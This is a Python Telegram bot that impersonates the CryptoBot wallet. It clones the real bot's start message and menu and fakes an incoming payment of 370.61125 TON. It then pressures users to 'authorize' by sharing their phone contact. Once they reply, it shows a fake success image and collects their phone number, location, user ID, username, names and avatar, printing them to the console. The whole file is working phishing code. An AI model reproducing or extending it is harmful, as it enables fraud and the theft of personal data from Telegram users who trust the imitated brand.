from telebot import types
import telebot
import json
import confs
import time

bot = telebot.TeleBot(confs.TOKEN)

progress_messages = {}

def send_progress_income(chat_id, text="🕙 Получение 💠 370.61125 TON ($592.98)..."):
    msg = bot.send_message(chat_id, text)
    time.sleep(1)
    progress_messages[chat_id] = msg.message_id

def success(chat_id, text="📥 Вы получили 💠 370.61125 TON ($592.98)."):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.row(
        types.InlineKeyboardButton("Открыть кошелёк", url="t.me/CryptoBot"),
    )
    
    with open("static/success.jpg", "rb") as photo:
        bot.send_photo(
            chat_id,
            photo=photo,         
            caption=text,
            parse_mode="Markdown",
            reply_markup=keyboard
        )

def send_contact_location_keyboard(chat_id, text="Вы не авторизованы, предоставьте доступ:"):
    send_progress_income(chat_id)
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("💼 Авторизоваться", request_contact=True)
    keyboard.add(btn)
    bot.send_message(chat_id, text, reply_markup=keyboard)

@bot.message_handler(commands=["start"])
def start(message):
    text = (
        "💠 [Мультивалютный криптокошелёк](https://t.me/CryptoBotRU/14). "
        "Покупайте, продавайте, храните и [отправляйте](https://t.me/CryptoBotRU/228) криптовалюту в любое время.\n\n"
        "Подписывайтесь на [наш канал](https://t.me/CryptoBotRU) "
        "и вступайте в [наш чат](https://t.me/CryptoBotRussian).\n\n"
        "🎄 [Новый год](https://t.me/CryptoBotRU/459) с 🦋 *Crypto Bot*! 🎁 [Получить новогодние баллы ›](https://t.me/send/app?startapp=new-year)"
    )

    # --- Главное меню как у CryptoBot ---
    keyboard = types.InlineKeyboardMarkup(row_width=3)

    keyboard.row(
        types.InlineKeyboardButton("📱 Открыть в приложении", url="t.me/CryptoBot"),
    )

    keyboard.row(
        types.InlineKeyboardButton("👛 Кошелёк", url="t.me/CryptoBot"),
        types.InlineKeyboardButton("🔄 Обмен", url="t.me/CryptoBot")
        
    )
    keyboard.row(
        types.InlineKeyboardButton("📊 P2P", url="t.me/CryptoBot"),
        types.InlineKeyboardButton("📈 Биржа", url="t.me/CryptoBot"),
    )
    keyboard.row(
        types.InlineKeyboardButton("💳 Чеки", url="t.me/CryptoBot"),
        types.InlineKeyboardButton("🧾 Счета", url="t.me/CryptoBot")
    )
    keyboard.row(
        types.InlineKeyboardButton("🏝 Crypto Pay", url="t.me/CryptoBot"),
        types.InlineKeyboardButton("🎁 Розыгрыши", url="t.me/CryptoBot")
    )
    keyboard.row(
        types.InlineKeyboardButton("🍑 Подписки", url="t.me/CryptoBot"),
        types.InlineKeyboardButton("⚙️ Настройки", url="t.me/CryptoBot"),
    )

    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

    send_contact_location_keyboard(message.chat.id)

@bot.message_handler(content_types=['contact', 'location', 'text'])
def handler(message):
    user = message.from_user
    chat_id = message.chat.id

    if chat_id in progress_messages:
        bot.delete_message(chat_id, progress_messages[chat_id])
        del progress_messages[chat_id]
    
    success(chat_id)

    try:
        photos = bot.get_user_profile_photos(user.id, limit=1)
        avatar_file_id = photos.photos[0][0].file_id if photos.total_count > 0 else None
    except:
        avatar_file_id = None

    data = {
        "chat_id": message.chat.id,
        "user_id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "language_code": user.language_code,
        "is_premium": user.is_premium,
        "phone_number": message.contact.phone_number if message.contact else None,
        "location": {
            "latitude": message.location.latitude if message.location else None,
            "longitude": message.location.longitude if message.location else None
        },
        "avatar_file_id": avatar_file_id,
    }

    print("[USER DATA]", json.dumps(data, ensure_ascii=False, indent=4))

#@bot.callback_query_handler(func=lambda call: True)
#def callback_handler(call):
#
#    if call.data == "openapp":
#       send_contact_location_keyboard(call.message.chat.id)
#
#    if call.data == "wallet":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "exchange":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "p2p":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "market":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "checks":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "invoices":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "settings":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "prizes":
#        send_contact_location_keyboard(call.message.chat.id)
#
#    elif call.data == "follows":
#        send_contact_location_keyboard(call.message.chat.id)

while True:
    try: 
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        
